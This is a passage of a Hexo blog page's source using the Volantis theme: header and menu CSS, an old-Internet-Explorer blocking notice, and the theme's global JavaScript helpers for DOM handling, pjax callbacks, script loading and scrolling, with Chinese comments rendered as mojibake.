    box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1);
    -webkit-box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1);
  }
}
@media screen and (max-width: 500px) {
  .l_header .m_search .input {
    background: var(--color-block);
    padding-left: 8px;
    border: none;
  }
  .l_header .m_search .input:hover,
  .l_header .m_search .input:focus {
    border: none;
  }
}
@media (max-width: 500px) {
  .l_header .m_search {
    left: 0;
    width: 0;
    overflow: hidden;
    position: absolute;
    background: #fff;
    transition: all 0.28s ease;
    -webkit-transition: all 0.28s ease;
    -khtml-transition: all 0.28s ease;
    -moz-transition: all 0.28s ease;
    -o-transition: all 0.28s ease;
    -ms-transition: all 0.28s ease;
  }
  .l_header .m_search .input {
    border-radius: 32px;
    -webkit-border-radius: 32px;
    margin-left: 16px;
    padding-left: 16px;
  }
  .l_header.z_search-open .m_search {
    width: 100%;
  }
  .l_header.z_search-open .m_search .input {
    width: calc(100% - 120px);
  }
}
ul.m-pc >li>a {
  color: inherit;
  border-bottom: 2px solid transparent;
}
ul.m-pc >li>a:active,
ul.m-pc >li>a.active {
  border-bottom: 2px solid #3dd9b6;
}
ul.m-pc li:hover >ul.list-v,
ul.list-v li:hover >ul.list-v {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
}
ul.nav-list-h {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  align-items: stretch;
}
ul.nav-list-h>li {
  position: relative;
  justify-content: center;
  -webkit-justify-content: center;
  -khtml-justify-content: center;
  -moz-justify-content: center;
  -o-justify-content: center;
  -ms-justify-content: center;
  height: 100%;
  line-height: 2.4;
  border-radius: 4px;
  -webkit-border-radius: 4px;
}
ul.nav-list-h>li >a {
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  font-weight: 600;
}
ul.list-v {
  z-index: 1;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  position: absolute;
  background: var(--color-card);
  box-shadow: 0 2px 4px 0px rgba(0,0,0,0.08), 0 4px 8px 0px rgba(0,0,0,0.08), 0 8px 16px 0px rgba(0,0,0,0.08);
  -webkit-box-shadow: 0 2px 4px 0px rgba(0,0,0,0.08), 0 4px 8px 0px rgba(0,0,0,0.08), 0 8px 16px 0px rgba(0,0,0,0.08);
  margin-top: -6px;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  padding: 8px 0;
}
ul.list-v.show {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
}
ul.list-v hr {
  margin-top: 8px;
  margin-bottom: 8px;
}
ul.list-v >li {
  white-space: nowrap;
  word-break: keep-all;
}
ul.list-v >li.header {
  font-size: 0.78125rem;
  font-weight: bold;
  line-height: 2em;
  color: var(--color-meta);
  margin: 8px 16px 4px;
}
ul.list-v >li.header i {
  margin-right: 8px;
}
ul.list-v >li ul {
  margin-left: 0;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  margin-top: -40px;
}
ul.list-v .aplayer-container {
  min-height: 64px;
  padding: 6px 16px;
}
ul.list-v >li>a {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  color: var(--color-list);
  font-size: 0.875rem;
  font-weight: bold;
  line-height: 36px;
  padding: 0 20px 0 16px;
  text-overflow: ellipsis;
  margin: 0 4px;
  border-radius: 4px;
  -webkit-border-radius: 4px;
}
@media screen and (max-width: 1024px) {
  ul.list-v >li>a {
    line-height: 40px;
  }
}
ul.list-v >li>a >i {
  margin-right: 8px;
}
ul.list-v >li>a:active,
ul.list-v >li>a.active {
  color: var(--color-list-hl);
}
ul.list-v >li>a:hover {
  color: var(--color-list-hl);
  background: var(--color-site-bg);
}
.l_header .menu >ul>li>a {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  padding: 0 8px;
}
.l_header .menu >ul>li>a >i {
  margin-right: 4px;
}
.l_header ul.nav-list-h>li {
  color: var(--color-list);
  line-height: 64px;
}
.l_header ul.nav-list-h>li >a {
  max-height: 64px;
  overflow: hidden;
  color: inherit;
}
.l_header ul.nav-list-h>li >a:active,
.l_header ul.nav-list-h>li >a.active {
  color: #3dd9b6;
}
.l_header ul.nav-list-h>li:hover>a {
  color: var(--color-list-hl);
}
.l_header ul.nav-list-h>li i.music {
  animation: rotate-effect 1.5s linear infinite;
  -webkit-animation: rotate-effect 1.5s linear infinite;
  -khtml-animation: rotate-effect 1.5s linear infinite;
  -moz-animation: rotate-effect 1.5s linear infinite;
  -o-animation: rotate-effect 1.5s linear infinite;
  -ms-animation: rotate-effect 1.5s linear infinite;
}
@-moz-keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
@-webkit-keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
@-o-keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
@keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
.menu-phone li ul.list-v {
  right: calc(100% - 0.5 * 16px);
}
.menu-phone li ul.list-v ul {
  right: calc(100% - 0.5 * 16px);
}
#wrapper {
  max-width: 1080px;
  margin: auto;
}
@media screen and (min-width: 2048px) {
  #wrapper {
    max-width: 55vw;
  }
}
#wrapper .menu {
  -webkit-box-flex: 1;
  -moz-box-flex: 1;
  -webkit-flex: 1 1;
  -ms-flex: 1 1;
  flex: 1 1;
  margin: 0 16px 0 0;
}
#wrapper .menu .list-v ul {
  left: calc(100% - 0.5 * 16px);
}
.menu-phone {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  margin-top: 16px;
  right: 8px;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.menu-phone ul {
  right: calc(100% - 0.5 * 16px);
}
@media screen and (max-width: 500px) {
  .menu-phone {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: block;
  }
}
.l_header {
  max-width: 65vw;
  left: calc((100% - 65vw) * 0.5);
  border-bottom-left-radius: 8px;
  border-bottom-right-radius: 8px;
}
@media screen and (max-width: 2048px) {
  .l_header {
    max-width: 1112px;
    left: calc((100% - 1112px) * 0.5);
  }
}
@media screen and (max-width: 1112px) {
  .l_header {
    left: 0;
    border-radius: 0;
    -webkit-border-radius: 0;
    max-width: 100%;
  }
}
@media screen and (max-width: 500px) {
  .l_header .container {
    margin-left: 0;
    margin-right: 0;
  }
  .l_header #wrapper .nav-main .title {
    padding-left: 16px;
    padding-right: 16px;
  }
  .l_header #wrapper .nav-sub {
    width: 100%;
  }
  .l_header #wrapper .nav-sub .title {
    overflow-y: scroll;
    margin-top: 2px;
    padding: 8px 16px;
  }
  .l_header #wrapper .switcher {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: -ms-flexbox /* TWEENER - IE 10 */;
    display: -webkit-flex /* NEW - Chrome */;
    display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
    display: flex;
    margin-right: 8px;
  }
  .l_header .menu {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: none;
  }
}
@media screen and (max-width: 500px) {
  .list-v li {
    max-width: 270px;
  }
}
#u-search {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  padding: 60px 20px;
  z-index: 1001;
}
@media screen and (max-width: 680px) {
  #u-search {
    padding: 0px;
  }
}

  </style>
  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
  
<script>
if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
    document.write(
	'<style>'+
		'html{'+
			'overflow-x: hidden !important;'+
			'overflow-y: hidden !important;'+
		'}'+
		'.kill-ie{'+
			'text-align:center;'+
			'height: 100%;'+
			'margin-top: 15%;'+
			'margin-bottom: 5500%;'+
		'}'+
    '.kill-t{'+
      'font-size: 2rem;'+
    '}'+
    '.kill-c{'+
      'font-size: 1.2rem;'+
    '}'+
		'#l_header,#l_body{'+
			'display: none;'+
		'}'+
	'</style>'+
    '<div class="kill-ie">'+
        `<span class="kill-t"><b>Sorry, your browser cannot access this site</b></span><br/>`+
        `<span class="kill-c">Microsoft has terminated support for Internet Explorer (IE) 10 and earlier versions in 2016. <br/>There are great security risks to continue using it. Please use contemporary mainstream browsers to access.</span><br/>`+
        `<a target="_blank" rel="noopener" href="https://blogs.windows.com/windowsexperience/2021/05/19/the-future-of-internet-explorer-on-windows-10-is-in-microsoft-edge/"><strong>Learn more ></strong></a>`+
    '</div>');
</script>


<noscript>
	<style>
		html{
			overflow-x: hidden !important;
			overflow-y: hidden !important;
		}
		.kill-noscript{
			text-align:center;
			height: 100%;
			margin-top: 15%;
			margin-bottom: 5500%;
		}
    .kill-t{
      font-size: 2rem;
    }
    .kill-c{
      font-size: 1.2rem;
    }
		#l_header,#l_body{
			display: none;
		}
	</style>
    <div class="kill-noscript">
        <span class="kill-t"><b>Sorry, your browser cannot access this site</b></span><br/>
        <span class="kill-c">This page requires browser support (enable) JavaScript</span><br/>
        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=ÂêØÁî®JavaScript"><strong>Learn more ></strong></a>
    </div>
</noscript>


  <script>
  /************Ëøô‰∏™Êñá‰ª∂Â≠òÊîæ‰∏çÈúÄË¶ÅÈáçËΩΩÁöÑÂÖ®Â±ÄÂèòÈáèÂíåÂÖ®Â±ÄÂáΩÊï∞*********/
  window.volantis = {}; // volantis ÂÖ®Â±ÄÂèòÈáè
  volantis.debug = "env"; // Ë∞ÉËØïÊ®°Âºè
  volantis.dom = {}; // È°µÈù¢Dom see: /source/js/app.js etc.

  volantis.GLOBAL_CONFIG ={
    debug: "env",
    cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
    default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
    lastupdate: new Date(1717665089587),
    sidebar: {
      for_page: ["blogger","category","tagcloud","webinfo","lastupdate"],
      for_post: ["toc"],
      webinfo: {
        lastupd: {
          enable: true,
          friendlyShow: true
        },
        runtime: {
          data: "2022/12/04",
          unit: "Â§©"
        }
      }
    },
    plugins: {
      message: {"enable":true,"css":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/izitoast/dist/css/iziToast.min.css","js":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/izitoast/dist/js/iziToast.min.js","icon":{"default":"fa-solid fa-info-circle light-blue","quection":"fa-solid fa-question-circle light-blue"},"time":{"default":5000,"quection":20000},"position":"topRight","transitionIn":"bounceInLeft","transitionOut":"fadeOutRight","titleColor":"var(--color-text)","messageColor":"var(--color-text)","backgroundColor":"var(--color-card)","zindex":2147483647,"copyright":{"enable":true,"title":"Áü•ËØÜÂÖ±‰∫´ËÆ∏ÂèØÂçèËÆÆ","message":"ËØ∑ÈÅµÂÆà CC BY-NC-SA 4.0 ÂçèËÆÆ„ÄÇ","icon":"far fa-copyright light-blue"},"aplayer":{"enable":true,"play":"fa-solid fa-play","pause":"fa-solid fa-pause"},"rightmenu":{"enable":true,"notice":true}},
      fancybox: {"css":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/@fancyapps/ui/dist/fancybox.css","js":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/@fancyapps/ui/dist/fancybox.umd.js"},
      
      
      
    }
  }

  /******************** volantis.EventListener ********************************/
  // ‰∫ã‰ª∂ÁõëÂê¨Âô® see: /source/js/app.js
  volantis.EventListener = {}
  // ËøôÈáåÂ≠òÊîæpjaxÂàáÊç¢È°µÈù¢Êó∂Â∞ÜË¢´ÁßªÈô§ÁöÑ‰∫ã‰ª∂ÁõëÂê¨Âô®
  volantis.EventListener.list = []
  //ÊûÑÈÄ†ÊñπÊ≥ï
  function volantisEventListener(type, f, ele) {
    this.type = type
    this.f = f
    this.ele = ele
  }
  // ÁßªÈô§‰∫ã‰ª∂ÁõëÂê¨Âô®
  volantis.EventListener.remove = () => {
    volantis.EventListener.list.forEach(function (i) {
      i.ele.removeEventListener(i.type, i.f, false)
    })
    volantis.EventListener.list = []
  }
  /******************** volantis.dom.$ ********************************/
  // Ê≥®ÔºöËøôÈáåÊ≤°ÊúâÈÄâÊã©Âô®Ôºå‰πüÊ≤°ÊúâforEach‰∏ÄÊ¨°Âè™Â§ÑÁêÜ‰∏Ä‰∏™domÔºåËøôÈáåÈáçÊñ∞Â∞ÅË£Ö‰∏ªÈ¢òÂ∏∏Áî®ÁöÑdomÊñπÊ≥ïÔºåËøîÂõûÁöÑÊòØdomÂØπË±°ÔºåÂØπË±°ÂåÖÂê´‰∫Ü‰ª•‰∏ãÊñπÊ≥ïÔºåÂêåÊó∂‰øùÁïôdomÁöÑÂéüÁîüAPI
  function volantisDom(ele) {
    if (!ele) ele = document.createElement("div")
    this.ele = ele;
    // ==============================================================
    this.ele.find = (c) => {
      let q = this.ele.querySelector(c)
      if (q)
        return new volantisDom(q)
    }
    // ==============================================================
    this.ele.hasClass = (c) => {
      return this.ele.className.match(new RegExp('(\\s|^)' + c + '(\\s|$)'));
    }
    this.ele.addClass = (c) => {
      this.ele.classList.add(c);
      return this.ele
    }
    this.ele.removeClass = (c) => {
      this.ele.classList.remove(c);
      return this.ele
    }
    this.ele.toggleClass = (c) => {
      if (this.ele.hasClass(c)) {
        this.ele.removeClass(c)
      } else {
        this.ele.addClass(c)
      }
      return this.ele
    }
    // ==============================================================
    // ÂèÇÊï∞ r ‰∏∫ true Ë°®Á§∫pjaxÂàáÊç¢È°µÈù¢Êó∂‰∫ã‰ª∂ÁõëÂê¨Âô®Â∞ÜË¢´ÁßªÈô§Ôºåfalse‰∏çÁßªÈô§
    this.ele.on = (c, f, r = 1) => {
      this.ele.addEventListener(c, f, false)
      if (r) {
        volantis.EventListener.list.push(new volantisEventListener(c, f, this.ele))
      }
      return this.ele
    }
    this.ele.click = (f, r) => {
      this.ele.on("click", f, r)
      return this.ele
    }
    this.ele.scroll = (f, r) => {
      this.ele.on("scroll", f, r)
      return this.ele
    }
    // ==============================================================
    this.ele.html = (c) => {
      // if(c=== undefined){
      //   return this.ele.innerHTML
      // }else{
      this.ele.innerHTML = c
      return this.ele
      // }
    }
    // ==============================================================
    this.ele.hide = (c) => {
      this.ele.style.display = "none"
      return this.ele
    }
    this.ele.show = (c) => {
      this.ele.style.display = "block"
      return this.ele
    }
    // ==============================================================
    return this.ele
  }
  volantis.dom.$ = (ele) => {
    return !!ele ? new volantisDom(ele) : null;
  }
  /******************** RunItem ********************************/
  function RunItem() {
    this.list = []; // Â≠òÊîæÂõûË∞ÉÂáΩÊï∞
    this.start = () => {
      for (var i = 0; i < this.list.length; i++) {
        this.list[i].run();
      }
    };
    this.push = (fn, name, setRequestAnimationFrame = true) => {
      let myfn = fn
      if (setRequestAnimationFrame) {
        myfn = ()=>{
          volantis.requestAnimationFrame(fn)
        }
      }
      var f = new Item(myfn, name);
      this.list.push(f);
    };
    this.remove = (name) =>{
      for (let index = 0; index < this.list.length; index++) {
        const e = this.list[index];
        if (e.name == name) {
          this.list.splice(index,1);
        }
      }
    }
    // ÊûÑÈÄ†‰∏Ä‰∏™ÂèØ‰ª•runÁöÑÂØπË±°
    function Item(fn, name) {
      // ÂáΩÊï∞ÂêçÁß∞
      this.name = name || fn.name;
      // runÊñπÊ≥ï
      this.run = () => {
        try {
          fn()
        } catch (error) {
          console.log(error);
        }
      };
    }
  }
  /******************** Pjax ********************************/
  // /layout/_plugins/pjax/index.ejs
  // volantis.pjax.send(callBack[,"callBackName"]) ‰º†ÂÖ•pjax:sendÂõûË∞ÉÂáΩÊï∞
  // volantis.pjax.push(callBack[,"callBackName"]) ‰º†ÂÖ•pjax:completeÂõûË∞ÉÂáΩÊï∞
  // volantis.pjax.error(callBack[,"callBackName"]) ‰º†ÂÖ•pjax:errorÂõûË∞ÉÂáΩÊï∞
  volantis.pjax = {};
  volantis.pjax.method = {
    complete: new RunItem(),
    error: new RunItem(),
    send: new RunItem(),
  };
  volantis.pjax = Object.assign(volantis.pjax, {
    push: volantis.pjax.method.complete.push,
    error: volantis.pjax.method.error.push,
    send: volantis.pjax.method.send.push,
  });
  /******************** RightMenu ********************************/
  // volantis.rightmenu.handle(callBack[,"callBackName"]) Â§ñÈÉ®ËèúÂçïÈ°πÊéßÂà∂
  // ÂèØÂú® volantis.mouseEvent Â§ÑËé∑ÂèñÂè≥ÈîÆ‰∫ã‰ª∂
  volantis.rightmenu = {};
  volantis.rightmenu.method = {
    handle: new RunItem(),
  }
  volantis.rightmenu = Object.assign(volantis.rightmenu, {
    handle: volantis.rightmenu.method.handle.push,
  });
  /********************  Dark Mode  ********************************/
  // /layout/_partial/scripts/darkmode.ejs
  // volantis.dark.mode ÂΩìÂâçÊ®°Âºè dark or light
  // volantis.dark.toggle() ÊöóÈªëÊ®°ÂºèËß¶ÂèëÂô®
  // volantis.dark.push(callBack[,"callBackName"]) ‰º†ÂÖ•Ëß¶ÂèëÂô®ÂõûË∞ÉÂáΩÊï∞
  volantis.dark = {};
  volantis.dark.method = {
    toggle: new RunItem(),
  };
  volantis.dark = Object.assign(volantis.dark, {
    push: volantis.dark.method.toggle.push,
  });
  /********************  Message  ********************************/
  // VolantisApp.message
  /********************  isMobile  ********************************/
  // /source/js/app.js
  // volantis.isMobile
  // volantis.isMobileOld
  /********************ËÑöÊú¨Âä®ÊÄÅÂä†ËΩΩÂáΩÊï∞********************************/
  // volantis.js(src, cb)  cb ÂèØ‰ª•‰º†ÂÖ•onloadÂõûË∞ÉÂáΩÊï∞ ÊàñËÄÖ JSONÂØπË±° ‰æãÂ¶Ç: volantis.js("src", ()=>{}) Êàñ volantis.js("src", {defer:true,onload:()=>{}})
  // volantis.css(src)

  // ËøîÂõûPromiseÂØπË±°ÔºåÂ¶Ç‰∏ãÊñπÊ≥ïÂêåÊ≠•Âä†ËΩΩËµÑÊ∫êÔºåËøôÂà©‰∫éÂ§ÑÁêÜÊñá‰ª∂ËµÑÊ∫ê‰πãÈó¥ÁöÑ‰æùËµñÂÖ≥Á≥ªÔºå‰æãÂ¶ÇÔºöAPlayer ÈúÄË¶ÅÂú® MetingJS ‰πãÂâçÂä†ËΩΩ
  // (async () => {
  //     await volantis.js("...theme.plugins.aplayer.js.aplayer...")
  //     await volantis.js("...theme.plugins.aplayer.js.meting...")
  // })();

  // Â∑≤ÁªèÂä†ÂÖ•‰∫ÜsetTimeout
  volantis.js = (src, cb) => {
    return new Promise(resolve => {
      setTimeout(function () {
        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
        var script = document.createElement("script");
        script.setAttribute("type", "text/javascript");
        if (cb) {
          if (JSON.stringify(cb)) {
            for (let p in cb) {
              if (p == "onload") {
                script[p] = () => {
                  cb[p]()
                  resolve()
                }
              } else {
                script[p] = cb[p]
                script.onload = resolve
              }
            }
          } else {
            script.onload = () => {
              cb()
              resolve()
            };
          }
        } else {
          script.onload = resolve
        }
        script.setAttribute("src", src);
        HEAD.appendChild(script);
      });
    });
  }
  volantis.css = (src) => {
    return new Promise(resolve => {
      setTimeout(function () {
        var link = document.createElement('link');
        link.rel = "stylesheet";
        link.href = src;
        link.onload = resolve;
        document.getElementsByTagName("head")[0].appendChild(link);
      });
    });
  }
  /********************ÊåâÈúÄÂä†ËΩΩÁöÑÊèí‰ª∂********************************/
  // volantis.import.jQuery().then(()=>{})
  volantis.import = {
    jQuery: () => {
      if (typeof jQuery == "undefined") {
        return volantis.js("https://unpkg.com/volantis-static@0.0.1654736714924/libs/jquery/dist/jquery.min.js")
      } else {
        return new Promise(resolve => {
          resolve()
        });
      }
    }
  }
  /********************** requestAnimationFrame ********************************/
  // 1„ÄÅrequestAnimationFrame ‰ºöÊääÊØè‰∏ÄÂ∏ß‰∏≠ÁöÑÊâÄÊúâ DOM Êìç‰ΩúÈõÜ‰∏≠Ëµ∑Êù•ÔºåÂú®‰∏ÄÊ¨°ÈáçÁªòÊàñÂõûÊµÅ‰∏≠Â∞±ÂÆåÊàêÔºåÂπ∂‰∏îÈáçÁªòÊàñÂõûÊµÅÁöÑÊó∂Èó¥Èó¥ÈöîÁ¥ßÁ¥ßË∑üÈöèÊµèËßàÂô®ÁöÑÂà∑Êñ∞È¢ëÁéáÔºå‰∏ÄËà¨Êù•ËØ¥ÔºåËøô‰∏™È¢ëÁéá‰∏∫ÊØèÁßí60Â∏ß„ÄÇ
  // 2„ÄÅÂú®ÈöêËóèÊàñ‰∏çÂèØËßÅÁöÑÂÖÉÁ¥†‰∏≠ÔºårequestAnimationFrame Â∞Ü‰∏ç‰ºöËøõË°åÈáçÁªòÊàñÂõûÊµÅÔºåËøôÂΩìÁÑ∂Â∞±ÊÑèÂë≥ÁùÄÊõ¥Â∞ëÁöÑÁöÑ cpuÔºågpu ÂíåÂÜÖÂ≠ò‰ΩøÁî®Èáè„ÄÇ
  volantis.requestAnimationFrame = (fn)=>{
    if (!window.requestAnimationFrame) {
      window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
    }
    window.requestAnimationFrame(fn)
  }
  /************************ layoutHelper *****************************************/
  volantis.layoutHelper = (helper, html, opt)=>{
    opt = Object.assign({clean:false, pjax:true}, opt)
    function myhelper(helper, html, clean) {
      volantis.tempDiv = document.createElement("div");
      volantis.tempDiv.innerHTML = html;
      let layoutHelper = document.querySelector("#layoutHelper-"+helper)
      if (layoutHelper) {
        if (clean) {
          layoutHelper.innerHTML = ""
        }
        layoutHelper.append(volantis.tempDiv);
      }
    }
    myhelper(helper, html, opt.clean)
    if (opt.pjax) {
      volantis.pjax.push(()=>{
        myhelper(helper, html, opt.clean)
      },"layoutHelper-"+helper)
    }
  }
  /****************************** ÊªöÂä®‰∫ã‰ª∂Â§ÑÁêÜ ****************************************/
  volantis.scroll = {
    engine: new RunItem(),
    unengine: new RunItem(),
  };
  volantis.scroll = Object.assign(volantis.scroll, {
    push: volantis.scroll.engine.push,
  });
  // ÊªöÂä®Êù°Ë∑ùÁ¶ªÈ°∂ÈÉ®ÁöÑË∑ùÁ¶ª
  volantis.scroll.getScrollTop = () =>{
    let scrollPos;
    if (window.pageYOffset) {
      scrollPos = window.pageYOffset;
    } else if (document.compatMode && document.compatMode != 'BackCompat') {
      scrollPos = document.documentElement.scrollTop;
    } else if (document.body) {
      scrollPos = document.body.scrollTop;
    }
    return scrollPos;
  }
  // ‰ΩøÁî® requestAnimationFrame Â§ÑÁêÜÊªöÂä®‰∫ã‰ª∂
  // `volantis.scroll.del` ‰∏≠Â≠òÂÇ®‰∫Ü‰∏Ä‰∏™Êï∞ÂÄº, ËØ•Êï∞ÂÄºÊ£ÄÊµã‰∏ÄÂÆöÊó∂Èó¥Èó¥ÈöîÂÜÖÊªöÂä®Êù°ÊªöÂä®ÁöÑ‰ΩçÁßª, Êï∞ÂÄºÁöÑÊ£ÄÊµãÈ¢ëÁéáÊòØÊµèËßàÂô®ÁöÑÂà∑Êñ∞È¢ëÁéá. Êï∞ÂÄº‰∏∫Ê≠£Êï∞Êó∂, Ë°®Á§∫Âêë‰∏ãÊªöÂä®. Êï∞ÂÄº‰∏∫Ë¥üÊï∞Êó∂, Ë°®Á§∫Âêë‰∏äÊªöÂä®.
  volantis.scroll.handleScrollEvents = () => {
    volantis.scroll.lastScrollTop = volantis.scroll.getScrollTop()
    function loop() {
      const scrollTop = volantis.scroll.getScrollTop();
      if (volantis.scroll.lastScrollTop !== scrollTop) {
        volantis.scroll.del = scrollTop - volantis.scroll.lastScrollTop;
        volantis.scroll.lastScrollTop = scrollTop;
        // if (volantis.scroll.del > 0) {
        //   console.log("Âêë‰∏ãÊªöÂä®");
        // } else {
